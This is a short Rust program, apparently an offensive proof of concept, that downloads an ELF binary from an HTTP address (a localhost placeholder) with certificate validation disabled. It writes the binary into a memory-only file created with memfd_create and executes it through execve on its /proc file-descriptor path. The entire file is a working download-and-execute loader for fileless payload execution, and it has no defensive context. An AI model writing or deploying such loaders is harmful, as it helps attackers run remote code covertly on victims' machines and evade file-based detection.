use libc::{c_char, execve, getpid, memfd_create, write};
use reqwest;
use std::ffi::CString;

fn download_elf() -> Vec<u8> {
    let url = "http://127.0.0.1:9090/bar";
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let binary = client.get(url).send().unwrap().bytes().unwrap();
    binary.to_vec()
}

fn main() {
    /* casting &str to *const c_char */
    let rs_name: &str = "foo";
    let c_str = CString::new(rs_name).unwrap();
    let c_name = c_str.as_ptr() as *const c_char;

    let elf = download_elf();

    unsafe {
        let c_elf = elf.as_ptr();
        let fd = memfd_create(c_name, 0);
        let pid = getpid();

        println!("[+] PID: {}", pid);
        println!("[+] File descriptor: {:?}", fd);

        let written_bytes = write(fd, c_elf as _, elf.len());

        if written_bytes != 0 {
            println!("[+] Memory written!");
        }

        let path = format!("/proc/{}/fd/{}", pid, fd);
        let cs_path = CString::new(path).unwrap();
        let c_path = cs_path.as_ptr() as *const c_char;

        println!("[+] Full path at address: {:?}", c_path);
        println!("[+] Trying to execute ELF from memory...");

        execve(c_path, std::ptr::null(), std::ptr::null());
    }
}
